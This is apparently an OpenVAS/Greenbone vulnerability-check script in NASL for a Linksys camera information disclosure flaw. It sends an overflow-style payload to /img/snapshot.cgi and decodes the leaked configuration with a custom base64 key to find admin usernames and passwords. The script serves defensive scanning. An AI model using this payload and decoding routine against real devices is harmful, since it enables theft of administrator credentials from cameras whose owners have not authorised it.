if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105105" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_name( "Multiple Linksys Products Information Disclosure" );
	script_xref( name: "URL", value: "https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-Slides.pdf" );
	script_tag( name: "impact", value: "Exploiting this issue could allow an attacker read the config of the device including
  usernames and passwords." );
	script_tag( name: "vuldetect", value: "Send a HTTP GET request and check the response." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "summary", value: "Multiple Linksys products are prone to an information disclosure vulnerability." );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2014-11-04 13:38:34 +0100 (Tue, 04 Nov 2014)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "gb_thttpd_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "thttpd/detected" );
	exit( 0 );
}
CPE = "cpe:/a:acme:thttpd";
require("host_details.inc.sc");
require("http_func.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
payload = crap( data: "A", length: 148 ) + raw_string( 0x88, 0x9B );
url = "/img/snapshot.cgi?" + payload;
req = "GET " + url + " HTTP/1.0\r\n\r\n";
result = http_send_recv( port: port, data: req, bodyonly: FALSE );
if(!ContainsString( result, "Content-type: application/configuration" )){
	exit( 99 );
}
buf = split( buffer: result, sep: "\r\n\r\n", keep: FALSE );
if(isnull( buf[2] )){
	exit( 0 );
}
decoded_config = base64_decode( str: buf[2], key_str: "ACEGIKMOQSUWYBDFHJLNPRTVXZacegikmoqsuwybdfhjlnprtvxz0246813579=+/" );
if(ContainsString( decoded_config, "admin_name" ) || ContainsString( decoded_config, "admin_password" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 0 );

